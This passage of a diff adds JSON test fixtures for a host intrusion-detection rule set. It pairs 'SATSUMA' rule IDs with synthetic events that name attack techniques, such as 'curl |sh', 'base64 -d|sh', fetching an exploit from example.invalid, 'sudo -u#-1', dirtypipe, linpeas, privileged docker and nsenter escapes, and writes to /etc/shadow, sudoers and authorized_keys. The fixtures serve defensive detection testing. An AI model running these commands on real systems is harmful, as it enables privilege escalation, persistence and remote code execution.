+      "id": "audit-143",
+      "timestamp": 1793435796,
+      "source": "audit",
+      "pid": 4242,
+      "starttime": 1234,
+      "exe": "/opt/isolated-fixture/tool",
+      "cmd": "fixture",
+      "uid": 1000,
+      "parent_cmd": "fixture-parent",
+      "action": "file_access",
+      "kind": "process",
+      "category": "host",
+      "operation": "write",
+      "file_path": "/var/www/html/fixture"
+    }
+  },
+  {
+    "rule_id": "SATSUMA-IMP-006",
+    "event": {
+      "id": "audit-144",
+      "timestamp": 1793435796,
+      "source": "sys_proc",
+      "pid": 4242,
+      "starttime": 1234,
+      "exe": "/opt/isolated-fixture/tool",
+      "cmd": "stress",
+      "uid": 1000,
+      "parent_cmd": "fixture-parent",
+      "action": "new_process",
+      "kind": "process",
+      "category": "host"
+    }
+  },
+  {
+    "rule_id": "SATSUMA-LAT-001",
+    "event": {
+      "id": "audit-145",
+      "timestamp": 1793435796,
+      "source": "sys_proc",
+      "pid": 4242,
+      "starttime": 1234,
+      "exe": "/opt/isolated-fixture/tool",
+      "cmd": "ssh -o StrictHostKeyChecking=no",
+      "uid": 1000,
+      "parent_cmd": "fixture-parent",
+      "action": "new_process",
+      "kind": "process",
+      "category": "host"
+    }
+  },
+  {
+    "rule_id": "SATSUMA-LAT-002",
+    "event": {
+      "id": "audit-146",
+      "timestamp": 1793435796,
+      "source": "sys_proc",
+      "pid": 4242,
+      "starttime": 1234,
+      "exe": "/opt/isolated-fixture/tool",
+      "cmd": "scp /etc/",
+      "uid": 1000,
+      "parent_cmd": "fixture-parent",
+      "action": "new_process",
+      "kind": "process",
+      "category": "host"
+    }
+  },
+  {
+    "rule_id": "SATSUMA-LAT-003",
+    "event": {
+      "id": "audit-147",
+      "timestamp": 1793435796,
+      "source": "sys_proc",
+      "pid": 4242,
+      "starttime": 1234,
+      "exe": "/opt/isolated-fixture/tool",
+      "cmd": "smbclient",
+      "uid": 1000,
+      "parent_cmd": "fixture-parent",
+      "action": "new_process",
+      "kind": "process",
+      "category": "host"
+    }
+  },
+  {
+    "rule_id": "SATSUMA-LAT-004",
+    "event": {
+      "id": "audit-148",
+      "timestamp": 1793435796,
+      "source": "sys_proc",
+      "pid": 4242,
+      "starttime": 1234,
+      "exe": "/opt/isolated-fixture/tool",
+      "cmd": "xfreerdp",
+      "uid": 1000,
+      "parent_cmd": "fixture-parent",
+      "action": "new_process",
+      "kind": "process",
+      "category": "host"
+    }
+  },
+  {
+    "rule_id": "SATSUMA-LAT-005",
+    "event": {
+      "id": "audit-149",
+      "timestamp": 1793435796,
+      "source": "sys_proc",
+      "pid": 4242,
+      "starttime": 1234,
+      "exe": "/opt/isolated-fixture/tool",
+      "cmd": "vncviewer",
+      "uid": 1000,
+      "parent_cmd": "fixture-parent",
+      "action": "new_process",
+      "kind": "process",
+      "category": "host"
+    }
+  },
+  {
+    "rule_id": "SATSUMA-LAT-006",
+    "event": {
+      "id": "audit-150",
+      "timestamp": 1793435796,
+      "source": "sys_proc",
+      "pid": 4242,
+      "starttime": 1234,
+      "exe": "/opt/isolated-fixture/tool",
+      "cmd": "docker run --privileged",
+      "uid": 1000,
+      "parent_cmd": "fixture-parent",
+      "action": "new_process",
+      "kind": "process",
+      "category": "host"
+    }
+  },
+  {
+    "rule_id": "SATSUMA-RAM-005",
+    "event": {
+      "id": "audit-151",
+      "timestamp": 1793435796,
+      "source": "memory",
+      "pid": 4242,
+      "starttime": 1234,
+      "exe": "/opt/isolated-fixture/tool",
+      "cmd": "fixture",
+      "uid": 1000,
+      "parent_cmd": "fixture-parent",
+      "action": "executable_code_mismatch",
+      "kind": "process",
+      "category": "host"
+    }
+  },
+  {
+    "rule_id": "SATSUMA-NET-201",
+    "event": {
+      "id": "audit-152",
+      "timestamp": 1793435796,
+      "source": "sys_proc",
+      "pid": 4242,
+      "starttime": 1234,
+      "exe": "/opt/isolated-fixture/tool",
+      "cmd": "fixture",
+      "uid": 1000,
+      "parent_cmd": "fixture-parent",
+      "action": "new_port",
+      "kind": "process",
+      "category": "host"
+    }
+  },
+  {
+    "rule_id": "SATSUMA-NET-202",
+    "event": {
+      "id": "audit-153",
+      "timestamp": 1793435796,
+      "source": "audit",
+      "pid": 4242,
+      "starttime": 1234,
+      "exe": "/opt/isolated-fixture/tool",
+      "cmd": "fixture",
+      "uid": 1000,
+      "parent_cmd": "fixture-parent",
+      "action": "file_access",
+      "kind": "process",
+      "category": "host",
+      "operation": "write",
+      "file_path": "/etc/nftables.conf"
+    }
+  },
+  {
+    "rule_id": "SATSUMA-NET-203",
+    "event": {
+      "id": "audit-154",
+      "timestamp": 1793435796,
+      "source": "audit",
+      "pid": 4242,
+      "starttime": 1234,
+      "exe": "/opt/isolated-fixture/tool",
+      "cmd": "fixture",
+      "uid": 1000,
+      "parent_cmd": "fixture-parent",
+      "action": "file_access",
+      "kind": "process",
+      "category": "host",
+      "operation": "write",
+      "file_path": "/etc/resolv.conf"
+    }
+  },
+  {
+    "rule_id": "SATSUMA-PERS-001",
+    "event": {
+      "id": "audit-155",
+      "timestamp": 1793435796,
+      "source": "audit",
+      "pid": 4242,
+      "starttime": 1234,
+      "exe": "/opt/isolated-fixture/tool",
+      "cmd": "fixture",
+      "uid": 1000,
+      "parent_cmd": "fixture-parent",
+      "action": "file_access",
+      "kind": "process",
+      "category": "host",
+      "operation": "write",
+      "file_path": "/var/spool/cron/fixture"
+    }
+  },
+  {
+    "rule_id": "SATSUMA-PERS-002",
+    "event": {
+      "id": "audit-156",
+      "timestamp": 1793435797,
+      "source": "audit",
+      "pid": 4242,
+      "starttime": 1234,
+      "exe": "/opt/isolated-fixture/tool",
+      "cmd": "fixture",
+      "uid": 1000,
+      "parent_cmd": "fixture-parent",
+      "action": "file_access",
+      "kind": "process",
+      "category": "host",
+      "operation": "write",
+      "file_path": "/etc/systemd/system/fixture.service"
+    }
+  },
+  {
+    "rule_id": "SATSUMA-PERS-003",
+    "event": {
+      "id": "audit-157",
+      "timestamp": 1793435797,
+      "source": "audit",
+      "pid": 4242,
+      "starttime": 1234,
+      "exe": "/opt/isolated-fixture/tool",
+      "cmd": "fixture",
+      "uid": 1000,
+      "parent_cmd": "fixture-parent",
+      "action": "file_access",
+      "kind": "process",
+      "category": "host",
+      "operation": "write",
+      "file_path": "/root/.ssh/authorized_keys"
+    }
+  },
+  {
+    "rule_id": "SATSUMA-PERS-004",
+    "event": {
+      "id": "audit-158",
+      "timestamp": 1793435797,
+      "source": "audit",
+      "pid": 4242,
+      "starttime": 1234,
+      "exe": "/opt/isolated-fixture/tool",
+      "cmd": "fixture",
+      "uid": 1000,
+      "parent_cmd": "fixture-parent",
+      "action": "file_access",
+      "kind": "process",
+      "category": "host",
+      "operation": "write",
+      "file_path": "/root/.bashrc"
+    }
+  },
+  {
+    "rule_id": "SATSUMA-PERS-005",
+    "event": {
+      "id": "audit-159",
+      "timestamp": 1793435797,
+      "source": "audit",
+      "pid": 4242,
+      "starttime": 1234,
+      "exe": "/opt/isolated-fixture/tool",
+      "cmd": "fixture",
+      "uid": 1000,
+      "parent_cmd": "fixture-parent",
+      "action": "file_access",
+      "kind": "process",
+      "category": "host",
+      "operation": "write",
+      "file_path": "/etc/init.d/fixture"
+    }
+  },
+  {
+    "rule_id": "SATSUMA-PERS-006",
+    "event": {
+      "id": "audit-160",
+      "timestamp": 1793435797,
+      "source": "audit",
+      "pid": 4242,
+      "starttime": 1234,
+      "exe": "/opt/isolated-fixture/tool",
+      "cmd": "fixture",
+      "uid": 1000,
+      "parent_cmd": "fixture-parent",
+      "action": "file_access",
+      "kind": "process",
+      "category": "host",
+      "operation": "write",
+      "file_path": "/etc/xdg/autostart/fixture"
+    }
+  },
+  {
+    "rule_id": "SATSUMA-PERS-007",
+    "event": {
+      "id": "audit-161",
+      "timestamp": 1793435797,
+      "source": "audit",
+      "pid": 4242,
+      "starttime": 1234,
+      "exe": "/opt/isolated-fixture/tool",
+      "cmd": "fixture",
+      "uid": 1000,
+      "parent_cmd": "fixture-parent",
+      "action": "file_access",
+      "kind": "process",
+      "category": "host",
+      "operation": "write",
+      "file_path": "/etc/modules"
+    }
+  },
+  {
+    "rule_id": "SATSUMA-PERS-008",
+    "event": {
+      "id": "audit-162",
+      "timestamp": 1793435797,
+      "source": "audit",
+      "pid": 4242,
+      "starttime": 1234,
+      "exe": "/opt/isolated-fixture/tool",
+      "cmd": "fixture",
+      "uid": 1000,
+      "parent_cmd": "fixture-parent",
+      "action": "file_access",
+      "kind": "process",
+      "category": "host",
+      "operation": "write",
+      "file_path": "/etc/pam.d/fixture"
+    }
+  },
+  {
+    "rule_id": "SATSUMA-PRIV-001",
+    "event": {
+      "id": "audit-163",
+      "timestamp": 1793435797,
+      "source": "sys_proc",
+      "pid": 4242,
+      "starttime": 1234,
+      "exe": "/opt/isolated-fixture/tool",
+      "cmd": "sudo su",
+      "uid": 1000,
+      "parent_cmd": "fixture-parent",
+      "action": "new_process",
+      "kind": "process",
+      "category": "host"
+    }
+  },
+  {
+    "rule_id": "SATSUMA-PRIV-002",
+    "event": {
+      "id": "audit-164",
+      "timestamp": 1793435797,
+      "source": "sys_proc",
+      "pid": 4242,
+      "starttime": 1234,
+      "exe": "/opt/isolated-fixture/tool",
+      "cmd": "sudoedit -s",
+      "uid": 1000,
+      "parent_cmd": "fixture-parent",
+      "action": "new_process",
+      "kind": "process",
+      "category": "host"
+    }
+  },
+  {
+    "rule_id": "SATSUMA-PRIV-003",
+    "event": {
+      "id": "audit-165",
+      "timestamp": 1793435797,
+      "source": "sys_proc",
+      "pid": 4242,
+      "starttime": 1234,
+      "exe": "/opt/isolated-fixture/tool",
+      "cmd": "pkexec --user",
+      "uid": 1000,
+      "parent_cmd": "fixture-parent",
+      "action": "new_process",
+      "kind": "process",
+      "category": "host"
+    }
+  },
+  {
+    "rule_id": "SATSUMA-PRIV-004",
+    "event": {
+      "id": "audit-166",
+      "timestamp": 1793435797,
+      "source": "sys_proc",
+      "pid": 4242,
+      "starttime": 1234,
+      "exe": "/opt/isolated-fixture/tool",
+      "cmd": "find / -perm -4000",
+      "uid": 1000,
+      "parent_cmd": "fixture-parent",
+      "action": "new_process",
+      "kind": "process",
+      "category": "host"
+    }
+  },
+  {
+    "rule_id": "SATSUMA-PRIV-005",
+    "event": {
+      "id": "audit-167",
+      "timestamp": 1793435797,
+      "source": "sys_proc",
+      "pid": 4242,
+      "starttime": 1234,
+      "exe": "/opt/isolated-fixture/tool",
+      "cmd": "dirtypipe",
+      "uid": 1000,
+      "parent_cmd": "fixture-parent",
+      "action": "new_process",
+      "kind": "process",
+      "category": "host"
+    }
+  },
+  {
+    "rule_id": "SATSUMA-PRIV-006",
+    "event": {
+      "id": "audit-168",
+      "timestamp": 1793435797,
+      "source": "sys_proc",
+      "pid": 4242,
+      "starttime": 1234,
+      "exe": "/opt/isolated-fixture/tool",
+      "cmd": "dirtypipe",
+      "uid": 1000,
+      "parent_cmd": "fixture-parent",
+      "action": "new_process",
+      "kind": "process",
+      "category": "host"
+    }
+  },
+  {
+    "rule_id": "SATSUMA-PRIV-007",
+    "event": {
+      "id": "audit-169",
+      "timestamp": 1793435797,
+      "source": "sys_proc",
+      "pid": 4242,
+      "starttime": 1234,
+      "exe": "/opt/isolated-fixture/tool",
+      "cmd": "sudo -R",
+      "uid": 1000,
+      "parent_cmd": "fixture-parent",
+      "action": "new_process",
+      "kind": "process",
+      "category": "host"
+    }
+  },
+  {
+    "rule_id": "SATSUMA-PRIV-008",
+    "event": {
+      "id": "audit-170",
+      "timestamp": 1793435797,
+      "source": "sys_proc",
+      "pid": 4242,
+      "starttime": 1234,
+      "exe": "/opt/isolated-fixture/tool",
+      "cmd": "getcap -r",
+      "uid": 1000,
+      "parent_cmd": "fixture-parent",
+      "action": "new_process",
+      "kind": "process",
+      "category": "host"
+    }
+  },
+  {
+    "rule_id": "SATSUMA-PRIV-009",
+    "event": {
+      "id": "audit-171",
+      "timestamp": 1793435797,
+      "source": "sys_proc",
+      "pid": 4242,
+      "starttime": 1234,
+      "exe": "/opt/isolated-fixture/tool",
+      "cmd": "find / -perm -4000",
+      "uid": 1000,
+      "parent_cmd": "fixture-parent",
+      "action": "new_process",
+      "kind": "process",
+      "category": "host"
+    }
+  },
+  {
+    "rule_id": "SATSUMA-PRIV-010",
+    "event": {
+      "id": "audit-172",
+      "timestamp": 1793435797,
+      "source": "sys_proc",
+      "pid": 4242,
+      "starttime": 1234,
+      "exe": "/opt/isolated-fixture/tool",
+      "cmd": "find / -perm -2000",
+      "uid": 1000,
+      "parent_cmd": "fixture-parent",
+      "action": "new_process",
+      "kind": "process",
+      "category": "host"
+    }
+  },
+  {
+    "rule_id": "SATSUMA-PRIV-011",
+    "event": {
+      "id": "audit-173",
+      "timestamp": 1793435797,
+      "source": "sys_proc",
+      "pid": 4242,
+      "starttime": 1234,
+      "exe": "/opt/isolated-fixture/tool",
+      "cmd": "/bin/sh -p",
+      "uid": 1000,
+      "parent_cmd": "fixture-parent",
+      "action": "new_process",
+      "kind": "process",
+      "category": "host"
+    }
+  },
+  {
+    "rule_id": "SATSUMA-PRIV-012",
+    "event": {
+      "id": "audit-174",
+      "timestamp": 1793435797,
+      "source": "sys_proc",
+      "pid": 4242,
+      "starttime": 1234,
+      "exe": "/opt/isolated-fixture/tool",
+      "cmd": "pkexec /tmp/",
+      "uid": 1000,
+      "parent_cmd": "fixture-parent",
+      "action": "new_process",
+      "kind": "process",
+      "category": "host"
+    }
+  },
+  {
+    "rule_id": "SATSUMA-PRIV-013",
+    "event": {
+      "id": "audit-175",
+      "timestamp": 1793435797,
+      "source": "sys_proc",
+      "pid": 4242,
+      "starttime": 1234,
+      "exe": "/opt/isolated-fixture/tool",
+      "cmd": "sudo -u#-1",
+      "uid": 1000,
+      "parent_cmd": "fixture-parent",
+      "action": "new_process",
+      "kind": "process",
+      "category": "host"
+    }
+  },
+  {
+    "rule_id": "SATSUMA-PRIV-014",
+    "event": {
+      "id": "audit-176",
+      "timestamp": 1793435797,
+      "source": "sys_proc",
+      "pid": 4242,
+      "starttime": 1234,
+      "exe": "/opt/isolated-fixture/tool",
+      "cmd": "sudo -R",
+      "uid": 1000,
+      "parent_cmd": "fixture-parent",
+      "action": "new_process",
+      "kind": "process",
+      "category": "host"
+    }
+  },
+  {
+    "rule_id": "SATSUMA-PRIV-015",
+    "event": {
+      "id": "audit-177",
+      "timestamp": 1793435797,
+      "source": "sys_proc",
+      "pid": 4242,
+      "starttime": 1234,
+      "exe": "/opt/isolated-fixture/tool",
+      "cmd": "getcap -r",
+      "uid": 1000,
+      "parent_cmd": "fixture-parent",
+      "action": "new_process",
+      "kind": "process",
+      "category": "host"
+    }
+  },
+  {
+    "rule_id": "SATSUMA-PRIV-016",
+    "event": {
+      "id": "audit-178",
+      "timestamp": 1793435797,
+      "source": "sys_proc",
+      "pid": 4242,
+      "starttime": 1234,
+      "exe": "/opt/isolated-fixture/tool",
+      "cmd": "dirtypipe",
+      "uid": 1000,
+      "parent_cmd": "fixture-parent",
+      "action": "new_process",
+      "kind": "process",
+      "category": "host"
+    }
+  },
+  {
+    "rule_id": "SATSUMA-PRIV-017",
+    "event": {
+      "id": "audit-179",
+      "timestamp": 1793435797,
+      "source": "sys_proc",
+      "pid": 4242,
+      "starttime": 1234,
+      "exe": "/opt/isolated-fixture/tool",
+      "cmd": "insmod",
+      "uid": 1000,
+      "parent_cmd": "fixture-parent",
+      "action": "new_process",
+      "kind": "process",
+      "category": "host"
+    }
+  },
+  {
+    "rule_id": "SATSUMA-PRIV-018",
+    "event": {
+      "id": "audit-180",
+      "timestamp": 1793435797,
+      "source": "sys_proc",
+      "pid": 4242,
+      "starttime": 1234,
+      "exe": "/opt/isolated-fixture/tool",
+      "cmd": "gcc -o exploit",
+      "uid": 1000,
+      "parent_cmd": "fixture-parent",
+      "action": "new_process",
+      "kind": "process",
+      "category": "host"
+    }
+  },
+  {
+    "rule_id": "SATSUMA-PRIV-019",
+    "event": {
+      "id": "audit-181",
+      "timestamp": 1793435797,
+      "source": "sys_proc",
+      "pid": 4242,
+      "starttime": 1234,
+      "exe": "/opt/isolated-fixture/tool",
+      "cmd": "curl https://example.invalid/exploit",
+      "uid": 1000,
+      "parent_cmd": "fixture-parent",
+      "action": "new_process",
+      "kind": "process",
+      "category": "host"
+    }
+  },
+  {
+    "rule_id": "SATSUMA-PRIV-020",
+    "event": {
+      "id": "audit-182",
+      "timestamp": 1793435797,
+      "source": "sys_proc",
+      "pid": 4242,
+      "starttime": 1234,
+      "exe": "/opt/isolated-fixture/tool",
+      "cmd": "LinEnum.sh",
+      "uid": 1000,
+      "parent_cmd": "fixture-parent",
+      "action": "new_process",
+      "kind": "process",
+      "category": "host"
+    }
+  },
+  {
+    "rule_id": "SATSUMA-PRIV-021",
+    "event": {
+      "id": "audit-183",
+      "timestamp": 1793435797,
+      "source": "sys_proc",
+      "pid": 4242,
+      "starttime": 1234,
+      "exe": "/opt/isolated-fixture/tool",
+      "cmd": "linpeas.sh",
+      "uid": 1000,
+      "parent_cmd": "fixture-parent",
+      "action": "new_process",
+      "kind": "process",
+      "category": "host"
+    }
+  },
+  {
+    "rule_id": "SATSUMA-PRIV-022",
+    "event": {
+      "id": "audit-184",
+      "timestamp": 1793435797,
+      "source": "sys_proc",
+      "pid": 4242,
+      "starttime": 1234,
+      "exe": "/opt/isolated-fixture/tool",
+      "cmd": "winpeas",
+      "uid": 1000,
+      "parent_cmd": "fixture-parent",
+      "action": "new_process",
+      "kind": "process",
+      "category": "host"
+    }
+  },
+  {
+    "rule_id": "SATSUMA-PRIV-023",
+    "event": {
+      "id": "audit-185",
+      "timestamp": 1793435797,
+      "source": "sys_proc",
+      "pid": 4242,
+      "starttime": 1234,
+      "exe": "/opt/isolated-fixture/tool",
+      "cmd": "pspy",
+      "uid": 1000,
+      "parent_cmd": "fixture-parent",
+      "action": "new_process",
+      "kind": "process",
+      "category": "host"
+    }
+  },
+  {
+    "rule_id": "SATSUMA-PRIV-024",
+    "event": {
+      "id": "audit-186",
+      "timestamp": 1793435797,
+      "source": "sys_proc",
+      "pid": 4242,
+      "starttime": 1234,
+      "exe": "/opt/isolated-fixture/tool",
+      "cmd": "sudo -n",
+      "uid": 1000,
+      "parent_cmd": "fixture-parent",
+      "action": "new_process",
+      "kind": "process",
+      "category": "host"
+    }
+  },
+  {
+    "rule_id": "SATSUMA-PRIV-025",
+    "event": {
+      "id": "audit-187",
+      "timestamp": 1793435797,
+      "source": "audit",
+      "pid": 4242,
+      "starttime": 1234,
+      "exe": "/opt/isolated-fixture/tool",
+      "cmd": "fixture",
+      "uid": 1000,
+      "parent_cmd": "fixture-parent",
+      "action": "file_access",
+      "kind": "process",
+      "category": "host",
+      "operation": "write",
+      "file_path": "/etc/sudoers"
+    }
+  },
+  {
+    "rule_id": "SATSUMA-PRIV-026",
+    "event": {
+      "id": "audit-188",
+      "timestamp": 1793435797,
+      "source": "audit",
+      "pid": 4242,
+      "starttime": 1234,
+      "exe": "/opt/isolated-fixture/tool",
+      "cmd": "fixture",
+      "uid": 1000,
+      "parent_cmd": "fixture-parent",
+      "action": "file_access",
+      "kind": "process",
+      "category": "host",
+      "operation": "write",
+      "file_path": "/etc/passwd"
+    }
+  },
+  {
+    "rule_id": "SATSUMA-PRIV-027",
+    "event": {
+      "id": "audit-189",
+      "timestamp": 1793435797,
+      "source": "audit",
+      "pid": 4242,
+      "starttime": 1234,
+      "exe": "/opt/isolated-fixture/tool",
+      "cmd": "fixture",
+      "uid": 1000,
+      "parent_cmd": "fixture-parent",
+      "action": "file_access",
+      "kind": "process",
+      "category": "host",
+      "operation": "write",
+      "file_path": "/etc/shadow"
+    }
+  },
+  {
+    "rule_id": "SATSUMA-PRIV-028",
+    "event": {
+      "id": "audit-190",
+      "timestamp": 1793435797,
+      "source": "sys_proc",
+      "pid": 4242,
+      "starttime": 1234,
+      "exe": "/opt/isolated-fixture/tool",
+      "cmd": "sudo su -",
+      "uid": 1000,
+      "parent_cmd": "fixture-parent",
+      "action": "new_process",
+      "kind": "process",
+      "category": "host"
+    }
+  },
+  {
+    "rule_id": "SATSUMA-PRIV-029",
+    "event": {
+      "id": "audit-191",
+      "timestamp": 1793435797,
+      "source": "sys_proc",
+      "pid": 4242,
+      "starttime": 1234,
+      "exe": "/opt/isolated-fixture/tool",
+      "cmd": "docker run --privileged",
+      "uid": 1000,
+      "parent_cmd": "fixture-parent",
+      "action": "new_process",
+      "kind": "process",
+      "category": "host"
+    }
+  },
+  {
+    "rule_id": "SATSUMA-PRIV-030",
+    "event": {
+      "id": "audit-192",
+      "timestamp": 1793435797,
+      "source": "sys_proc",
+      "pid": 4242,
+      "starttime": 1234,
+      "exe": "/opt/isolated-fixture/tool",
+      "cmd": "nsenter",
+      "uid": 1000,
+      "parent_cmd": "fixture-parent",
+      "action": "new_process",
+      "kind": "process",
+      "category": "host"
+    }
+  },
+  {
+    "rule_id": "SATSUMA-RAM-001",
+    "event": {
+      "id": "audit-193",
+      "timestamp": 1793435797,
+      "source": "memory",
+      "pid": 4242,
+      "starttime": 1234,
+      "exe": "/opt/isolated-fixture/tool",
+      "cmd": "fixture",
+      "uid": 1000,
+      "parent_cmd": "fixture-parent",
+      "action": "anonymous_rwx",
+      "kind": "process",
+      "category": "host"
+    }
+  },
+  {
+    "rule_id": "SATSUMA-RAM-002",
+    "event": {
+      "id": "audit-194",
+      "timestamp": 1793435797,
+      "source": "memory",
+      "pid": 4242,
+      "starttime": 1234,
+      "exe": "/opt/isolated-fixture/tool",
+      "cmd": "fixture",
+      "uid": 1000,
+      "parent_cmd": "fixture-parent",
+      "action": "memfd_executable",
+      "kind": "process",
+      "category": "host"
+    }
+  },
+  {
+    "rule_id": "SATSUMA-RAM-003",
+    "event": {
+      "id": "audit-195",
+      "timestamp": 1793435797,
+      "source": "memory",
+      "pid": 4242,
+      "starttime": 1234,
+      "exe": "/opt/isolated-fixture/tool",
+      "cmd": "fixture",
+      "uid": 1000,
+      "parent_cmd": "fixture-parent",
+      "action": "memfd_mapping",
+      "kind": "process",
+      "category": "host"
+    }
+  },
+  {
+    "rule_id": "SATSUMA-RAM-004",
+    "event": {
+      "id": "audit-196",
+      "timestamp": 1793435797,
+      "source": "memory",
+      "pid": 4242,
+      "starttime": 1234,
+      "exe": "/opt/isolated-fixture/tool",
+      "cmd": "fixture",
+      "uid": 1000,
+      "parent_cmd": "fixture-parent",
+      "action": "deleted_executable",
+      "kind": "process",
+      "category": "host"
+    }
+  },
+  {
+    "rule_id": "SATSUMA-ROOT-001",
+    "event": {
+      "id": "audit-197",
+      "timestamp": 1793435797,
+      "source": "sys_proc",
+      "pid": 4242,
+      "starttime": 1234,
+      "exe": "/opt/isolated-fixture/tool",
+      "cmd": "insmod",
+      "uid": 1000,
+      "parent_cmd": "fixture-parent",
+      "action": "new_process",
+      "kind": "process",
+      "category": "host"
+    }
+  },
+  {
+    "rule_id": "SATSUMA-ROOT-002",
+    "event": {
+      "id": "audit-198",
+      "timestamp": 1793435797,
+      "source": "sys_proc",
+      "pid": 4242,
+      "starttime": 1234,
+      "exe": "/opt/isolated-fixture/tool",
+      "cmd": "fixture",
+      "uid": 1000,
+      "parent_cmd": "fixture-parent",
+      "action": "new_process",
+      "kind": "process",
+      "category": "host",
+      "env": "LD_PRELOAD=fixture"
+    }
+  },
+  {
+    "rule_id": "SATSUMA-ROOT-003",
+    "event": {
+      "id": "audit-199",
+      "timestamp": 1793435797,
+      "source": "audit",
+      "pid": 4242,
+      "starttime": 1234,
+      "exe": "/opt/isolated-fixture/tool",
+      "cmd": "fixture",
+      "uid": 1000,
+      "parent_cmd": "fixture-parent",
+      "action": "file_access",
+      "kind": "process",
+      "category": "host",
+      "operation": "write",
+      "file_path": "/dev/fixture"
+    }
+  },
+  {
+    "rule_id": "SATSUMA-ROOT-004",
+    "event": {
+      "id": "audit-200",
+      "timestamp": 1793435797,
+      "source": "sys_proc",
+      "pid": 4242,
+      "starttime": 1234,
+      "exe": "/opt/isolated-fixture/tool",
+      "cmd": "unhide",
+      "uid": 1000,
+      "parent_cmd": "fixture-parent",
+      "action": "new_process",
+      "kind": "process",
+      "category": "host"
+    }
+  },
+  {
+    "rule_id": "SATSUMA-SUDO-HARD-001",
+    "event": {
+      "id": "audit-201",
+      "timestamp": 1793435797,
+      "source": "audit",
+      "pid": 4242,
+      "starttime": 1234,
+      "exe": "/opt/isolated-fixture/tool",
+      "cmd": "fixture",
+      "uid": 1000,
+      "parent_cmd": "fixture-parent",
+      "action": "file_access",
+      "kind": "process",
+      "category": "host",
+      "operation": "write",
+      "file_path": "/etc/sudoers"
+    }
+  },
+  {
+    "rule_id": "SATSUMA-SUDO-HARD-002",
+    "event": {
+      "id": "audit-202",
+      "timestamp": 1793435797,
+      "source": "sys_proc",
+      "pid": 4242,
+      "starttime": 1234,
+      "exe": "/opt/isolated-fixture/tool",
+      "cmd": "sudo -n",
+      "uid": 1000,
+      "parent_cmd": "fixture-parent",
+      "action": "new_process",
+      "kind": "process",
+      "category": "host"
+    }
+  },
+  {
+    "rule_id": "SATSUMA-SUDO-HARD-003",
+    "event": {
+      "id": "audit-203",
+      "timestamp": 1793435797,
+      "source": "audit",
+      "pid": 4242,
+      "starttime": 1234,
+      "exe": "/opt/isolated-fixture/tool",
+      "cmd": "fixture",
+      "uid": 1000,
+      "parent_cmd": "fixture-parent",
+      "action": "file_access",
+      "kind": "process",
+      "category": "host",
+      "operation": "read",
+      "file_path": "/etc/sudoers"
+    }
+  },
+  {
+    "rule_id": "SATSUMA-LOL-001",
+    "event": {
+      "id": "audit-204",
+      "timestamp": 1793435797,
+      "source": "sys_proc",
+      "pid": 4242,
+      "starttime": 1234,
+      "exe": "/opt/isolated-fixture/tool",
+      "cmd": "curl |sh",
+      "uid": 1000,
+      "parent_cmd": "fixture-parent",
+      "action": "new_process",
+      "kind": "process",
+      "category": "host"
+    }
+  },
+  {
+    "rule_id": "SATSUMA-LOL-002",
+    "event": {
+      "id": "audit-205",
+      "timestamp": 1793435797,
+      "source": "sys_proc",
+      "pid": 4242,
+      "starttime": 1234,
+      "exe": "/opt/isolated-fixture/tool",
+      "cmd": "base64 -d|sh",
+      "uid": 1000,
+      "parent_cmd": "fixture-parent",
+      "action": "new_process",
+      "kind": "process",
+      "category": "host"
+    }
+  },
+  {
+    "rule_id": "SATSUMA-LOL-003",
+    "event": {
+      "id": "audit-206",
+      "timestamp": 1793435797,
+      "source": "sys_proc",
+      "pid": 4242,
+      "starttime": 1234,
+      "exe": "/opt/isolated-fixture/tool",
+      "cmd": "python -c eval(",
+      "uid": 1000,
+      "parent_cmd": "fixture-parent",
+      "action": "new_process",
+      "kind": "process",
+      "category": "host"
+    }
+  },
+  {
+    "rule_id": "SATSUMA-LOL-004",
+    "event": {
+      "id": "audit-207",
+      "timestamp": 1793435797,
+      "source": "sys_proc",
+      "pid": 4242,
+      "starttime": 1234,
+      "exe": "/opt/isolated-fixture/tool",
+      "cmd": "script -q /dev/null",
+      "uid": 1000,
+      "parent_cmd": "fixture-parent",
+      "action": "new_process",
+      "kind": "process",
+      "category": "host"
+    }
+  },
+  {
+    "rule_id": "SATSUMA-FILELESS-001",
+    "event": {
+      "id": "audit-208",
+      "timestamp": 1793435797,
+      "source": "sys_proc",
+      "pid": 4242,
+      "starttime": 1234,
+      "exe": "/opt/isolated-fixture/tool",
+      "cmd": "memfd_create",
+      "uid": 1000,
+      "parent_cmd": "fixture-parent",
+      "action": "new_process",
+      "kind": "process",
+      "category": "host"
+    }
+  },
+  {
+    "rule_id": "SATSUMA-FILELESS-002",
+    "event": {
+      "id": "audit-209",
+      "timestamp": 1793435797,
+      "source": "sys_proc",
+      "pid": 4242,
+      "starttime": 1234,
+      "exe": "/dev/shm/",
+      "cmd": "fixture",
+      "uid": 1000,
+      "parent_cmd": "fixture-parent",
+      "action": "new_process",
+      "kind": "process",
+      "category": "host"
+    }
+  },
+  {
+    "rule_id": "SATSUMA-FILELESS-003",
+    "event": {
+      "id": "audit-210",
+      "timestamp": 1793435797,
+      "source": "sys_proc",
+      "pid": 4242,
+      "starttime": 1234,
+      "exe": "/opt/isolated-fixture/tool",
+      "cmd": "ptrace PTRACE_POKE",
+      "uid": 1000,
+      "parent_cmd": "fixture-parent",
+      "action": "new_process",
+      "kind": "process",
+      "category": "host"
+    }
+  },
+  {
+    "rule_id": "SATSUMA-CONT-101",
+    "event": {
+      "id": "audit-211",
+      "timestamp": 1793435797,
+      "source": "sys_proc",
+      "pid": 4242,
+      "starttime": 1234,
+      "exe": "/opt/isolated-fixture/tool",
+      "cmd": "/var/run/docker.sock",
+      "uid": 1000,
+      "parent_cmd": "fixture-parent",
+      "action": "new_process",
+      "kind": "process",
+      "category": "host"
+    }
+  },
+  {
+    "rule_id": "SATSUMA-CONT-102",
+    "event": {
+      "id": "audit-212",
+      "timestamp": 1793435797,
+      "source": "sys_proc",
+      "pid": 4242,
+      "starttime": 1234,
+      "exe": "/opt/isolated-fixture/tool",
+      "cmd": "nsenter -t 1 mount",
+      "uid": 1000,
+      "parent_cmd": "fixture-parent",
+      "action": "new_process",
+      "kind": "process",
+      "category": "host"
+    }
+  },
+  {
+    "rule_id": "SATSUMA-CLOUD-001",
+    "event": {
+      "id": "audit-213",
+      "timestamp": 1793435797,
+      "source": "sys_proc",
+      "pid": 4242,
+      "starttime": 1234,
+      "exe": "/opt/isolated-fixture/tool",
+      "cmd": "fixture 169.254.169.254",
+      "uid": 1000,
+      "parent_cmd": "fixture-parent",
+      "action": "new_process",
+      "kind": "process",
+      "category": "host"
+    }
+  },
+  {
+    "rule_id": "SATSUMA-CRED-101",
+    "event": {
+      "id": "audit-214",
+      "timestamp": 1793435797,
